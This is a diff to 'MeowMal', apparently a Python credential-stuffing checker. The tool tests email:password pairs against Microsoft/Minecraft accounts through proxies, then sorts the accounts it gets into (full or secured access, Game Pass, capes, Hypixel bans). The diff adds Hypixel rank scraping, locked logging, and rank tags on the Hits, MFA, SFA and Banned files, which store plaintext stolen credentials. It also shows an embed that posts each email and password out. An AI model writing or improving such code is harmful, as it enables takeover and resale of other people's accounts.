@@ -52,16 +52,6 @@ def get_optimized_timeout(config=None):
         return (3, 5)
     else:
         return config.get('timeout', 8) if config else 10
-try:
-    if hasattr(sys.stdout, 'reconfigure'):
-        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
-        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
-    else:
-        import codecs
-        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, errors='replace')
-        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, errors='replace')
-except Exception:
-    pass
 
 class SimpleUtils:
     _title_cache = ''
@@ -316,12 +306,13 @@ except ImportError:
     MINECRAFT_AVAILABLE = False
     print(f'{Fore.YELLOW}Warning: pyCraft not available. Hypixel ban checking disabled.{Fore.RESET}')
 ANSI_ESCAPE = re.compile('\\x1B(?:[@-Z\\\\-_]|\\[[0-?]*[ -/]*[@-~])')
-HYPIXEL_NAME = re.compile('(?<=content="Plancke" /><meta property="og:locale" content="en_US" /><meta property="og:description" content=").+?(?=")', re.S)
-HYPIXEL_LEVEL = re.compile('(?<=Level:</b> ).+?(?=<br/><b>)')
-FIRST_LOGIN = re.compile('(?<=<b>First login: </b>).+?(?=<br/><b>)')
-LAST_LOGIN = re.compile('(?<=<b>Last login: </b>).+?(?=<br/>)')
-BW_STARS = re.compile('(?<=<li><b>Level:</b> ).+?(?=</li>)')
-SB_NETWORTH = re.compile('(?<= Networth: ).+?(?=\\n)')
+HYPIXEL_NAME = re.compile(r'(?<=content="Plancke" /><meta property="og:locale" content="en_US" /><meta property="og:description" content=").+?(?=")', re.S)
+HYPIXEL_TITLE = re.compile(r'<title>(.+?)\s*\|\s*Plancke</title>', re.IGNORECASE)
+HYPIXEL_LEVEL = re.compile(r'(?<=Level:</b> ).+?(?=<br/><b>)')
+FIRST_LOGIN = re.compile(r'(?<=<b>First login: </b>).+?(?=<br/><b>)')
+LAST_LOGIN = re.compile(r'(?<=<b>Last login: </b>).+?(?=<br/>)')
+BW_STARS = re.compile(r'(?<=<li><b>Level:</b> ).+?(?=</li>)')
+SB_NETWORTH = re.compile(r'(?<= Networth: ).+?(?=\\n)')
 
 class UIManager:
 
@@ -340,6 +331,7 @@ class UIManager:
         self._cached_ascii_logo = None
         self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0}
         self.start_time = None
+        self._lock = threading.Lock()
 
     def reset_log_area(self):
         self.log_start_line = max(15, self.height - 10)
@@ -363,7 +355,7 @@ class UIManager:
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
             _title = Fore.CYAN
-            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.6 | Dev: MeowMal Dev's \n"
+            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.7 | Dev: MeowMal Dev's \n"
             print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
             print('')
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
@@ -423,19 +415,19 @@ class UIManager:
     def add_log(self, message, level='INFO'):
         if level not in ('HIT', 'ERROR') and (not (level == 'INFO' and message.startswith('Other:'))):
             return
-        if level == 'HIT':
-            log_entry = message
-        elif level == 'ERROR':
-            log_entry = f'{Fore.RED}[!]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}'
-        elif level == 'INFO' and message.startswith('Other:'):
-            log_entry = f'{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{message}{Style.RESET_ALL}'
-        else:
-            return
-        self.logs.append(log_entry)
-        if len(self.logs) > self.max_logs:
-            self.logs = self.logs[-self.max_logs:]
-        try:
-            if getattr(self, 'log_initialized', False) or getattr(self, 'cui_initialized', False):
+        with self._lock:
+            if level == 'HIT':
+                log_entry = message
+            elif level == 'ERROR':
+                log_entry = f'{Fore.RED}[!]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}'
+            elif level == 'INFO' and message.startswith('Other:'):
+                log_entry = f'{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{message}{Style.RESET_ALL}'
+            else:
+                return
+            self.logs.append(log_entry)
+            if len(self.logs) > self.max_logs:
+                self.logs = self.logs[-self.max_logs:]
+            try:
                 if getattr(self, 'cui_initialized', False):
                     log_start_line = getattr(self, 'log_start_line', max(15, self.height - 10))
                     log_line = log_start_line + 2 + self.log_area_count
@@ -443,30 +435,75 @@ class UIManager:
                         self.reset_log_area()
                         log_line = log_start_line + 2
                     print(f'\x1b[{log_line};0H{log_entry}\x1b[K\x1b[{self.height};0H', end='', flush=True)
+                    
+                    self.log_area_count += 1
+                    if self.log_area_count >= getattr(self, 'log_area_limit', 20):
+                        self.reset_log_area()
                 else:
-                    print(f'{log_entry}\x1b[K')
-                self.log_area_count += 1
-                if self.log_area_count >= getattr(self, 'log_area_limit', 20):
-                    self.reset_log_area()
-        except Exception as e:
-            print(f'Debug: add_log error: {e}')
-            pass
+                    if getattr(self, 'log_initialized', False):
+                        print(f'{log_entry}\x1b[K', flush=True)
+                    else:
+                        print(log_entry, flush=True)
+            except Exception as e:
+                print(f'Debug: add_log error: {e}')
+                pass
 
     def log_hit_formatted(self, capture_obj, extra_stats=None, precomputed_line=None):
         try:
-            formatted_line = precomputed_line if precomputed_line else capture_obj.builder()
-            if extra_stats:
-                if ' | ' in formatted_line:
-                    formatted_line = formatted_line.split(' | ')[0]
-                formatted_line += f' | {extra_stats}'
+            
+            elapsed_str = self._get_elapsed_time()
+            time_part = f'[{elapsed_str}]'
+            
             if capture_obj.banned and capture_obj.banned != 'False':
-                if 'Permanently' in str(capture_obj.banned) or 'Permanent' in str(capture_obj.banned):
-                    color = Fore.RED
-                else:
-                    color = Fore.BLUE
+                status_part = '[Banned]'
+                color = Fore.RED
             else:
-                color = Fore.GREEN
-            colored_line = f'{color}{formatted_line}{Style.RESET_ALL}'
+                status_part = '[Unbanned]'
+                if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
+                    color = Fore.CYAN
+                else:
+                    color = Fore.GREEN
+            
+            tags_part = ''
+            if capture_obj.type:
+                type_upper = str(capture_obj.type).upper()
+                if 'GAME PASS' in type_upper or 'XGP' in type_upper:
+                    if 'ULTIMATE' in type_upper or 'XGPU' in type_upper:
+                        tags_part += '[XGPU]'
+                    else:
+                        tags_part += '[XGP]'
+                if 'MINECRAFT' in type_upper or 'MC' in type_upper:
+                    tags_part += '[MC]'
+            if not tags_part:
+                tags_part = '[MC]'  
+            if capture_obj.capes and capture_obj.capes != '':
+                tags_part += f'[{capture_obj.capes}]'
+            if capture_obj.cape and capture_obj.cape == 'Yes':
+                tags_part += '[Optifine]'
+                    
+            pwd = capture_obj.password
+            if len(pwd) > 4:
+                masked_pwd = pwd[:2] + '*' * (len(pwd) - 4) + pwd[-2:]
+            else:
+                masked_pwd = '*' * len(pwd)
+            
+            if capture_obj.hypixl and capture_obj.hypixl != 'N/A':
+                user_display = capture_obj.hypixl
+            else:
+                user_display = capture_obj.name if capture_obj.name and capture_obj.name != 'N/A' else 'Unknown'
+
+            
+            account_part = f'{capture_obj.email}:{masked_pwd}:{user_display}'
+
+            stats_part = ''
+            if extra_stats:
+                clean_stats = extra_stats.strip(' |')
+                stats_part = f' | {clean_stats}'
+
+            final_content = f'{time_part} {status_part}{tags_part} {account_part}{stats_part}'
+            
+            colored_line = f'{color}{final_content}{Style.RESET_ALL}'
+            
             self.add_log(colored_line, 'HIT')
         except Exception:
             self.log_hit(getattr(capture_obj, 'email', ''), getattr(capture_obj, 'type', ''))
@@ -959,12 +996,13 @@ class Capture:
             ban_status = '[Unbanned]'
         tags = []
         if self.type:
-            if 'XGP' in self.type.upper():
-                if 'ULTIMATE' in self.type.upper() or 'XGPU' in self.type.upper():
+            type_upper = str(self.type).upper()
+            if 'GAME PASS' in type_upper or 'XGP' in type_upper:
+                if 'ULTIMATE' in type_upper or 'XGPU' in type_upper:
                     tags.append('[XGPU]')
                 else:
                     tags.append('[XGP]')
-            if 'MC' in self.type or 'Minecraft' in self.type:
+            if 'MINECRAFT' in type_upper or 'MC' in type_upper:
                 tags.append('[MC]')
         if hasattr(self, 'sfa') and self.sfa:
             tags.append('[SFA]')
@@ -1008,7 +1046,10 @@ class Capture:
         tags_str = ''.join(tags)
         stats_str = ' '.join(stats_parts) if stats_parts else ''
         
-        user_display = self.name if self.name and self.name != 'N/A' else 'Unknown'
+        if self.hypixl and self.hypixl != 'N/A':
+            user_display = self.hypixl
+        else:
+            user_display = self.name if self.name and self.name != 'N/A' else 'Unknown'
         capture_line = f'[{user_display}] {ban_status} {tags_str}{hypixel_level} {self.email}:{password_display}'
         
         if include_timestamp:
@@ -1032,43 +1073,62 @@ class Capture:
         global errors
         try:
             if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
-                tx = self.session.get('https://plancke.io/hypixel/player/stats/' + self.name, proxies=getproxy() if not is_no_proxy() else None, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False, timeout=(5, 8)).text
                 try:
-                    if config.get('hypixelname') and config.get('hypixel_name', True):
+                    proxy_to_use = getproxy() if not is_no_proxy() else None
+                    resp = self.session.get('https://plancke.io/hypixel/player/stats/' + self.name, proxies=proxy_to_use, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept-Encoding': 'gzip, deflate'}, verify=False, timeout=(5, 8))
+                    tx = resp.text
+                except Exception:
+                    raise
+
+                try:
+                    if config.get('hypixelname'):
                         match = HYPIXEL_NAME.search(tx)
                         if match:
                             self.hypixl = match.group()
+                            match_title = HYPIXEL_TITLE.search(tx)
+                            if match_title:
+                                self.hypixl = match_title.group(1)
+                            else:
+
+                                try:
+                                    pattern = r'\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]\s*' + re.escape(self.name)
+                                    match_brute = re.search(pattern, tx, re.IGNORECASE)
+                                    if match_brute:
+                                        self.hypixl = match_brute.group(0) 
+                                except:
+                                    pass
+                         
                 except:
                     pass
                 try:
-                    if config.get('hypixellevel') and config.get('hypixel_level', True):
+                    if config.get('hypixellevel'):
                         match = HYPIXEL_LEVEL.search(tx)
                         if match:
                             self.level = match.group()
                 except:
                     pass
                 try:
-                    if config.get('hypixelfirstlogin') and config.get('first_hypixel_login', True):
+                    if config.get('hypixelfirstlogin'):
                         match = FIRST_LOGIN.search(tx)
                         if match:
                             self.firstlogin = match.group()
                 except:
                     pass
                 try:
-                    if config.get('hypixellastlogin') and config.get('last_hypixel_login', True):
+                    if config.get('hypixellastlogin'):
                         match = LAST_LOGIN.search(tx)
                         if match:
                             self.lastlogin = match.group()
                 except:
                     pass
                 try:
-                    if config.get('hypixelbwstars') and config.get('hypixel_bedwars_stars', True):
+                    if config.get('hypixelbwstars'):
                         match = BW_STARS.search(tx)
                         if match:
                             self.bwstars = match.group()
                 except:
                     pass
-            if False and config.get('hypixelsbcoins') and config.get('hypixel_skyblock_coins', True):
+            if False and config.get('hypixelsbcoins'):
                 try:
                     req = self.session.get('https://sky.shiiyu.moe/stats/' + self.name, proxies=getproxy() if not is_no_proxy() else None, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}, verify=False, timeout=(5, 8))
                     if req.status_code == 200:
@@ -1104,12 +1164,14 @@ class Capture:
                     self.access = 'True'
                     mfa += 1
                     if config.get('mark_mfa', True):
-                        open(f'results/{fname}/MFA.txt', 'a').write(f'{self.email}:{self.password}\n')
+                        rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
+                        open(f'results/{fname}/MFA.txt', 'a').write(f'{self.email}:{self.password}{rank_str}\n')
                 else:
                     sfa += 1
                     self.access = 'False'
                     if config.get('mark_sfa', True):
-                        open(f'results/{fname}/SFA.txt', 'a').write(f'{self.email}:{self.password}\n')
+                        rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
+                        open(f'results/{fname}/SFA.txt', 'a').write(f'{self.email}:{self.password}{rank_str}\n')
             except:
                 self.access = 'Unknown'
 
@@ -1356,7 +1418,8 @@ class Capture:
                             except:
                                 self.banned = "[Permanently] Suspicious activity"
                             with open(f'results/{fname}/Banned.txt', 'a') as f:
-                                f.write(f'{self.email}:{self.password}\n')
+                                rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
+                                f.write(f'{self.email}:{self.password}{rank_str}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
                                 
@@ -1449,10 +1512,6 @@ class Capture:
                     original_stderr = sys.stderr
                     sys.stderr = StringIO()
                     try:
-                        def _suppress_errors(exc, exc_info):
-                            if "10053" in str(exc) or isinstance(exc, (ConnectionAbortedError, ConnectionResetError, BrokenPipeError)):
-                                pass
-                        connection._handle_exception = _suppress_errors
                         connection.connect()
                         c = 0
                         while self.banned == None and c < 2000:
@@ -1513,7 +1572,7 @@ class Capture:
             tries += 1
 
     def build_json_capture(self):
-        capture_data = {'username': self.name if self.name != 'N/A' else '', 'email': self.email, 'password': self.password, 'account_type': self.type, 'first_login': self.firstlogin if self.firstlogin else '', 'last_login': self.lastlogin if self.lastlogin else '', 'hypixel_level': float(self.level) if self.level else 0.0, 'bedwars_stars': int(self.bwstars) if self.bwstars else 0, 'skyblock_coins': self.sbcoins if self.sbcoins else 'N/A', 'capes': self.capes.split(', ') if self.capes and self.capes != '' else [], 'optifine_cape': True if self.cape == 'Yes' else False, 'can_change_name': True if self.namechanged == 'True' else False, 'last_name_change': self.lastchanged if self.lastchanged else '', 'banned': True if self.banned and self.banned != 'False' else False}
+        capture_data = {'username': self.name if self.name != 'N/A' else '', 'hypixel_rank': self.hypixl if self.hypixl else 'N/A', 'email': self.email, 'password': self.password, 'account_type': self.type, 'first_login': self.firstlogin if self.firstlogin else '', 'last_login': self.lastlogin if self.lastlogin else '', 'hypixel_level': float(self.level) if self.level else 0.0, 'bedwars_stars': int(self.bwstars) if self.bwstars else 0, 'skyblock_coins': self.sbcoins if self.sbcoins else 'N/A', 'capes': self.capes.split(', ') if self.capes and self.capes != '' else [], 'optifine_cape': True if self.cape == 'Yes' else False, 'can_change_name': True if self.namechanged == 'True' else False, 'last_name_change': self.lastchanged if self.lastchanged else '', 'banned': True if self.banned and self.banned != 'False' else False}
         if capture_data['banned']:
             ban_info = self._parse_ban_info(self.banned)
             if ban_info.get('ban_id'):
@@ -1713,7 +1772,8 @@ class Capture:
         
         try:
             with open(f'results/{fname}/Hits.txt', 'a') as file:
-                file.write(f'{self.email}:{self.password}\n')
+                rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
+                file.write(f'{self.email}:{self.password}{rank_str}\n')
                 with stats_lock:
                     hits += 1
                     
@@ -1766,7 +1826,9 @@ class Capture:
             fields = []
             fields.append({'name': '📧 ᴇᴍᴀɪʟ', 'value': f'`{self.email}`', 'inline': False})
             fields.append({'name': '🔑 ᴘᴀssᴡᴏʀᴅ', 'value': f'`{self.password}`', 'inline': False})
-            if self.name and self.name != 'N/A':
+            if self.hypixl and self.hypixl != 'N/A':
+                fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.hypixl}`', 'inline': True})
+            elif self.name and self.name != 'N/A':
                 fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.name}`', 'inline': True})
             if self.type:
                 fields.append({'name': ' ᴛʏᴘᴇ', 'value': str(self.type), 'inline': True})
